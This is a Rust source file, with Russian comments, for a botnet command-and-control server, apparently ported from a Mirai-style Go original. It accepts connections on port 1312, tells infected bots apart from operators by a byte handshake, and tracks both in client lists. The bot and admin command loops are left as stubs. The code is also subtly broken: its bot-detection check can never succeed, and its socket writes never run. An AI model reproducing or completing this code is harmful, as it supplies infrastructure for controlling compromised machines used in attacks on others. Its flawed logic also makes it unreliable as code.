use anyhow::{Context, Result};
use bytes::{Bytes, BytesMut};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::{io::{AsyncReadExt, AsyncWriteExt}, net::{TcpListener, TcpStream}, sync::RwLock, time::timeout};
use tracing::{info, error, warn, debug, instrument};
use std::sync::Arc;
use sqlx::{MySql, MySqlPool, Pool};
pub mod cnc;
pub mod support;

#[derive(Debug, Clone)]
pub struct CncConfig {
    pub bind_address: String,
    pub database_url: String,
    pub connection_timeout: Duration,
    pub max_connections: usize,
}

impl Default for CncConfig {
    fn default() -> Self {
        Self {
            bind_address: "0.0.0.0:1312".to_string(),
            database_url: "mysql://root:YOURMYSQLPASSWORD@127.0.0.1:3306/cosmic".to_string(),
            connection_timeout: Duration::from_secs(10),
            max_connections: 10000,
        }
    }
}

// Состояние сервера
#[derive(Debug)]
pub struct CncServer {
    config: CncConfig,
    client_list: Arc<RwLock<ClientList>>,
    database: Arc<Pool<MySql>>,
}

// Список клиентов
#[derive(Debug, Default)]
pub struct ClientList {
    bots: Vec<BotClient>,
    admins: Vec<AdminClient>,
}

// Бот клиент
#[derive(Debug, Clone)]
pub struct BotClient {
    pub conn: Arc<tokio::net::TcpStream>,
    pub version: u8,
    pub source: String,
    pub connected_at: std::time::SystemTime,
}

// Админ клиент
#[derive(Debug, Clone)]
pub struct AdminClient {
    pub conn: Arc<tokio::net::TcpStream>,
    pub connected_at: std::time::SystemTime,
}

// Типы сообщений
#[derive(Debug)]
pub enum MessageType {
    Bot(u8, String), // version, source
    Admin,
}

impl CncServer {
    pub async fn new(config: CncConfig) -> Result<Self> {
        // Подключение к базе данных
        let database = MySqlPool::connect(&config.database_url).await
            .context("Failed to connect to database")?;

        info!("Connected to database successfully");

        Ok(Self {
            config,
            client_list: Arc::new(RwLock::new(ClientList::default())),
            database: Arc::new(database),
        })
    }

    pub async fn run(&self) -> Result<()> {
        let listener = TcpListener::bind(&self.config.bind_address).await
            .with_context(|| format!("Failed to bind to {}", self.config.bind_address))?;

        info!("CNC Server started on {}", self.config.bind_address);

        loop {
            let (socket, addr) = listener.accept().await?;

            let server = self.clone();

            tokio::spawn(async move {
                if let Err(e) = server.handle_connection(socket, addr).await {
                    warn!("Connection from {} failed: {}", addr, e);
                }
            });
        }
    }

    #[instrument(skip(self, socket))]
    async fn handle_connection(&self, socket: TcpStream, addr: SocketAddr) -> Result<()> {
        debug!("New connection from {}", addr);

        // Устанавливаем таймаут
        let result = timeout(self.config.connection_timeout, async {
            Self::initial_handler(socket, self.client_list.clone()).await
        }).await;

        match result {
            Ok(Ok(_)) => {
                info!("Connection from {} handled successfully", addr);
            }
            Ok(Err(e)) => {
                warn!("Failed to handle connection from {}: {}", addr, e);
            }
            Err(_) => {
                warn!("Connection timeout from {}", addr);
            }
        }

        Ok(())
    }

    async fn initial_handler(
        socket: TcpStream,
        client_list: Arc<RwLock<ClientList>>,
    ) -> Result<()> {
        let mut socket = socket;

        // Читаем первые 32 байта как в Go версии
        let mut buf = [0u8; 32];
        let bytes_read = read_x_bytes(&mut socket, &mut buf).await?;

        if bytes_read == 0 {
            return Err(anyhow::anyhow!("No data received"));
        }

        // Анализируем заголовок как в Go коде
        let message_type = if bytes_read == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
            // Это бот
            let version = buf[3];
            let source = if version > 0 {
                // Читаем длину строки источника
                let mut len_buf = [0u8; 1];
                read_x_bytes(&mut socket, &mut len_buf).await?;
                let str_len = len_buf[0] as usize;

                if str_len > 0 {
                    let mut source_buf = vec![0u8; str_len];
                    read_x_bytes(&mut socket, &mut source_buf).await?;
                    String::from_utf8(source_buf)?
                } else {
                    String::new()
                }
            } else {
                String::new()
            };

            MessageType::Bot(version, source)
        } else {
            // Это админ
            MessageType::Admin
        };

        // Создаем соответствующего клиента
        match message_type {
            MessageType::Bot(version, source) => {
                let bot = BotClient {
                    conn: Arc::new(socket),
                    version,
                    source: source.clone(),
                    connected_at: std::time::SystemTime::now(),
                };

                {
                    let mut clients = client_list.write().await;
                    clients.bots.push(bot.clone());
                }

                info!("New bot connected: version={}, source={}", version, source.clone());
                bot.handle().await?;
            }
            MessageType::Admin => {
                let admin = AdminClient {
                    conn: Arc::new(socket),
                    connected_at: std::time::SystemTime::now(),
                };

                {
                    let mut clients = client_list.write().await;
                    clients.admins.push(admin.clone());
                }

                info!("New admin connected");
                admin.handle().await?;
            }
        }

        Ok(())
    }

    pub async fn get_stats(&self) -> ServerStats {
        let clients = self.client_list.read().await;
        ServerStats {
            total_bots: clients.bots.len(),
            total_admins: clients.admins.len(),
        }
    }
}

impl Clone for CncServer {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            client_list: Arc::clone(&self.client_list),
            database: Arc::clone(&self.database),
        }
    }
}

// Реализация для бота
impl BotClient {
    pub async fn handle(&self) -> Result<()> {
        // Здесь реализуем логику обработки бота
        // В оригинальном коде это было в NewBot(conn, buf[3], source).Handle()

        info!("Handling bot connection: version={}, source={}", self.version, self.source);

        // Пример: отправляем приветственное сообщение
        let welcome_msg = format!("Bot v{} connected from {}\n", self.version, self.source);
        // Если self.conn это Arc<Mutex<TcpStream>>
        if let Ok(mut conn_guard) = Arc::try_unwrap(self.conn.clone()) {
            let _ = conn_guard.write_all(welcome_msg.as_bytes()).await;
        }

        // Здесь может быть основной цикл обработки команд
        loop {
            tokio::time::sleep(Duration::from_secs(60)).await;
            // Keep alive или обработка команд
        }

        // Ok(())
    }
}

// Реализация для админа
impl AdminClient {
    pub async fn handle(&self) -> Result<()> {
        // Здесь реализуем логику обработки админа
        // В оригинальном коде это было в NewAdmin(conn).Handle()

        info!("Handling admin connection");

        // Пример: отправляем приветственное сообщение
        let welcome_msg = "Admin panel connected\n";
        if let Ok(mut conn_guard) = Arc::try_unwrap(self.conn.clone()) {
            let _ = conn_guard.write_all(welcome_msg.as_bytes()).await;
        }

        // Здесь может быть основной цикл обработки команд админа
        loop {
            tokio::time::sleep(Duration::from_secs(60)).await;
            // Обработка административных команд
        }

        // Ok(())
    }
}

// Утилитная функция для чтения точного количества байт
pub async fn read_x_bytes(conn: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
    let mut total_read = 0;
    let expected_len = buf.len();

    while total_read < expected_len {
        match conn.read(&mut buf[total_read..]).await {
            Ok(0) => {
                return Err(anyhow::anyhow!("Connection closed unexpectedly"));
            }
            Ok(n) => {
                total_read += n;
            }
            Err(e) => {
                return Err(anyhow::anyhow!("Failed to read from socket: {}", e));
            }
        }
    }

    Ok(total_read)
}

// Функция netshift из Go кода
pub fn netshift(prefix: u32, netmask: u8) -> u32 {
    prefix >> (32 - netmask)
}

// Статистика сервера
#[derive(Debug, Clone)]
pub struct ServerStats {
    pub total_bots: usize,
    pub total_admins: usize,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Инициализация логирования
    tracing_subscriber::fmt::init();

    // Загрузка конфигурации
    let config = CncConfig::default();

    info!("Starting CNC Server...");

    // Создание и запуск сервера
    let server = CncServer::new(config).await?;

    if let Err(e) = server.run().await {
        error!("Server error: {}", e);
        std::process::exit(1);
    }

    Ok(())
}

// Тесты
#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpStream;
    use std::net::TcpListener as StdTcpListener;

    #[test]
    fn test_netshift() {
        assert_eq!(netshift(0xFFFF_FFFF, 24), 0xFF);
        assert_eq!(netshift(0xC0A8_0101, 16), 0xC0A8);
        assert_eq!(netshift(0x1234_5678, 8), 0x12);
    }

    #[tokio::test]
    async fn test_read_x_bytes() {
        let (mut client, mut server) = create_test_connection().await;

        // Тест нормального чтения
        client.write_all(b"test").await.unwrap();
        let mut buf = [0u8; 4];
        let result = read_x_bytes(&mut server, &mut buf).await;
        assert!(result.is_ok());
        assert_eq!(&buf, b"test");

        // Тест неполного чтения (должен таймаут или ошибку)
        client.write_all(b"par").await.unwrap();
        let mut buf = [0u8; 4];
        let result = read_x_bytes(&mut server, &mut buf).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_bot_message_parsing() {
        let (mut client, server) = create_test_connection().await;

        // Бот сообщение: [0x00, 0x00, 0x00, version] + [source_len] + [source]
        let mut message = vec![0x00, 0x00, 0x00, 0x01]; // version = 1
        message.push(4); // source length = 4
        message.extend_from_slice(b"test"); // source = "test"

        client.write_all(&message).await.unwrap();

        let client_list = Arc::new(RwLock::new(ClientList::default()));
        let result = CncServer::initial_handler(server, client_list).await;

        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_admin_message_parsing() {
        let (mut client, server) = create_test_connection().await;

        // Админ сообщение (любые другие байты)
        let message = b"ADMIN";
        client.write_all(message).await.unwrap();

        let client_list = Arc::new(RwLock::new(ClientList::default()));
        let result = CncServer::initial_handler(server, client_list).await;

        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_client_list_management() {
        let client_list = Arc::new(RwLock::new(ClientList::default()));

        // Добавление бота
        {
            let mut clients = client_list.write().await;
            let bot = BotClient {
                conn: Arc::new(create_test_socket().await),
                version: 1,
                source: "test".to_string(),
                connected_at: std::time::SystemTime::now(),
            };
            clients.bots.push(bot);
        }

        // Проверка
        {
            let clients = client_list.read().await;
            assert_eq!(clients.bots.len(), 1);
            assert_eq!(clients.bots[0].version, 1);
            assert_eq!(clients.bots[0].source, "test");
        }
    }

    #[tokio::test]
    async fn test_server_stats() {
        let config = CncConfig::default();
        let server = CncServer::new(config).await.unwrap();

        let stats = server.get_stats().await;
        assert_eq!(stats.total_bots, 0);
        assert_eq!(stats.total_admins, 0);
    }

    async fn create_test_connection() -> (TcpStream, TcpStream) {
        let std_listener = StdTcpListener::bind("127.0.0.1:0").unwrap();
        let addr = std_listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            let (socket, _) = tokio::net::TcpListener::from_std(std_listener).unwrap().accept().await.unwrap();
            socket
        });

        let client = TcpStream::connect(addr).await.unwrap();
        let server = server_handle.await.unwrap();

        (client, server)
    }

    async fn create_test_socket() -> TcpStream {
        let (client, _) = create_test_connection().await;
        client
    }

    // Интеграционные тесты с mock базой данных
    mod integration_tests {
        use super::*;
        use sqlx::Row;

        #[tokio::test]
        async fn test_database_connection() {
            // Этот тест требует запущенную тестовую БД
            // В реальном проекте используйте testcontainers
            let config = CncConfig {
                database_url: "mysql://root:password@localhost:3306/test".to_string(),
                ..Default::default()
            };

            let result = CncServer::new(config).await;
            // Тест может падать если БД не доступна, это нормально
            if result.is_ok() {
                println!("Database connection test passed");
            }
        }
    }

    // Тесты производительности
    #[tokio::test]
    async fn test_performance() {
        use std::time::Instant;

        let start = Instant::now();

        // Тестируем быстродействие netshift
        for i in 0..1000 {
            let _ = netshift(i, 24);
        }

        let duration = start.elapsed();
        assert!(duration < Duration::from_secs(1));
    }

    // Тесты безопасности
    #[tokio::test]
    async fn test_security_boundaries() {
        // Тест на обработку больших source строк
        let (mut client, server) = create_test_connection().await;

        let mut message = vec![0x00, 0x00, 0x00, 0x01];
        message.push(255); // Максимальная длина
        message.extend(std::iter::repeat(b'A').take(255));

        client.write_all(&message).await.unwrap();

        let client_list = Arc::new(RwLock::new(ClientList::default()));
        let result = CncServer::initial_handler(server, client_list).await;

        // Должен обработать без паники
        assert!(result.is_ok());
    }
}